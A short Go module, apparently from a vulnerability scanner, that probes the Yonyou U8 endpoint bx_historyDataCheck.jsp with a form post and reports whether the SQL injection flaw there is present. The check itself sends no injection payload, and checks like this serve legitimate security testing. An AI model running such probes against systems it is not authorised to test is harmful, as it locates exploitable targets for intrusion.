package GRP_U8_historyDataCheck_sqljin

import (
	"fmt"
	"github.com/gookit/color"
	"github.com/imroc/req/v3"
	"time"
)

var (
	client = req.C().EnableForceHTTP1().EnableDumpEachRequest().SetTimeout(5 * time.Second)
	UA     = "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0"
)

func Run(url string) {
	url = url + "/u8qx/bx_historyDataCheck.jsp"
	data := map[string]string{
		"userName": "1",
	}

	resp, err := client.R().SetHeaders(map[string]string{
		"User-Agent":   UA,
		"Content-Type": "application/x-www-form-urlencoded",
	}).SetFormData(data).Post(url)

	if err != nil {
		fmt.Println("[-] Error accessing the target site, please check if the target site exists")
		return
	}

	content, err := resp.ToString()
	if err != nil {
		fmt.Println("[-] Error reading response body")
		return
	}

	if resp.Status == "200 OK" && content == "0" {
		color.Green.Println("[+] 用友 U8 bx_historyDataCheck SQL注入漏洞存在 -> " + url)
	} else {
		color.Red.Println("[-]用友 U8 bx_historyDataCheck SQL注入漏洞不存在")
	}
}
